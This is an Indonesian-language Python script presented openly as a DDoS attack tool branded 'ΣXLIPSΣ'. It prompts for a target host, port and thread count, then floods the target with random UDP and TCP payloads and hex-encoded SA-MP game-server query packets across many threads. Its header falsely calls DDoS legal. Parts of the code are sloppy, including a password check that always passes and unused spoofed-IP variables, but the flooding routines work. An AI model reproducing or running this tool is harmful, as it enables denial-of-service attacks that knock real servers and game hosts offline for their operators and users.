# ΣXLIPSΣ • DDOS ATTACK TOOLS
# JANGAN ABUSE KALO GA MAU DI BLACKLIST
# DDOS ITU BERSIFAT LEGAL JADI JANGAN DI SALAH GUNAKAN
import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

#Warna Untuk Tools
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'

os.system("clear")
password ="ΣXLIPSΣ"

for i in range(3):
	password = input(yellow+b+"[Σ] Masukan Password Tools : "+b+yellow)
	Σ=3
	if(password==password):
		time.sleep(5)
		print(pink+b+"[Σ] Correct Password Wait 5 Second!!!"+b+pink)
		break
	else:
		time.sleep(5)
		print(red+b+"\033[91m[×] Wrong Password!!! "+b+red)
		continue
time.sleep(5)
print(gren+b+"[Σ] Login Succesfull \033[92m√"+b+gren)
os.system("clear")

print("""
\033[94m
 
 ███████╗██╗███████╗██╗░░░░░██╗░░██╗ ╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝ ░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░ ██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░ ███████╗██║███████╗███████╗██╔╝╚██╗ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
         ++   ΣXLIPSΣ UDP Tools   ++
      ++    Dont Abusing My Tools   ++
""")

host = str(input(yellow+b+"ΣXLIPSΣ • Enter Attack Host Target    : "+b+yellow))
port = int(input(yellow+b+"ΣXLIPSΣ • Enter Attack Port Target  : "+b+yellow))
times = int(input(yellow+b+"ΣXLIPSΣ • Enter Packet Attack : "+b+yellow))
threads = int(input(yellow+b+"ΣXLIPSΣ • Enter Threads Attack : "+b+yellow))
choice = str(input(yellow+b+"ΣXLIPSΣ • Enter Start DDoS Attack? (+ ΣXLIPSΣ +) : "+b+yellow))
fake_ip = '182.21.20.32'
fake_ip = '144.76.38.22'
fake_ip = '113.218.77.15'
fake_ip = '128.111.31.1'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def DDoS():
	bytes = random._urandom(577)
	pack = random._urandom(577)
	Σ = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(host),int(port))
			for x in range(times):
				s.sendto(bytes,addr)
			print(Σ +"ΣXLIPSΣ Send Packets To Ip \033[91m{ip} \033[96mPort \033[96mPort \033[91m {port}")
		except:
			print(pink+b+"[Σ] ΣXLIPSΣ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}"+b+pink)

def DDoS2():
	bytes = random._urandom(577)
	pack = random._urandom(577)
	Σ = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,port))
			s.send(bytes)
			for x in range(times):
				s.send(bytes)
			print(Σ +"ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{}".format(host, port))

		except:
			s.close()
			print(pink+b+"[Σ] ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{}"+b+pink.format(host, port))
            

def DDoS3():
	bytes = random._urandom(577)
	pack = random._urandom(577)
	Σ = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,port))
			s.send(bytes)
			for x in range(times):
				s.send(bytes)
			print(Σ +"ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{}".format(host, port))
		except:
			s.close()
			print(pink+b+"[Σ] ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{}"+b+pink.format(host, port))
            
  
def DDoS4():
	bytes = random._urandom(577)
	pack = random._urandom(577)
	Σ = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,port))
			s.send(bytes)
			for x in range(times):
				s.send(bytes)
			print(Σ +"ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{}".format(host, port))
		except:
			s.close()
			print(pink+b+"[Σ] ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{} "+b+pink.format(host, port))
			
def DDoS5():
	bytes = random._urandom(577)
	pack = random._urandom(577)
	Σ = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,port))
			s.send(bytes)
			for x in range(times):
				s.send(bytes)
			print(Σ +"ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{}".format(host, port))
		except:
			s.close()
			print(pink+b+"[Σ] ΣXLIPSΣ Send Packets To Ip Port\033[92m ==========> {}:{}"+b+pink.format(host, port))
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def DDoS(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (host, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (host, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (host, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (host, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (host, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(9999):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'ΣXLIPSΣ':
		th = threading.Thread(target = DDoS)
		th.start()
		th = threading.Thread(target = DDoS2)
		th.start()
		th = threading.Thread(target = DDoS3)
		th.start()
		th = threading.Thread(target = DDoS4)
		th.start()
else:
		th = threading.Thread(target = DDoS5)
		th.start()